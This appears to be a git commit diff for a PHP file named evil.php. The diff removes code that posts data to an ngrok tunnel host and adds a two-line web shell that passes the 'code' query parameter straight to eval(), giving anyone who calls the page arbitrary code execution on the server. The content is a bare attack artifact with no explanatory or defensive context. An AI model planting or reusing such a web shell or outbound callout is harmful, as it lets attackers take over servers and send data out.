f0d5daf3044d323c506a34342a45c13fd2ffa420
kalout <71024732+kalout@users.noreply.github.com>
2023-02-05 15:42:49 +0200

    Update evil.php

--- evil.php
+++ evil.php
@@ -1,15 +1,4 @@
 <?php
-	// $code = $_GET['code'];
-	// eval($code);
-
-	// Send a POST request to https://f889-185-187-131-200.ngrok.io
-	$url = 'https://f889-185-187-131-200.ngrok.io';
-	$ch = curl_init($url);
-
-	curl_setopt($ch, CURLOPT_POST, 1);
-	curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
-	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-
-	$response = curl_exec($ch);
-	curl_close($ch);
+	$code = $_GET['code'];
+	eval($code);
 ?>
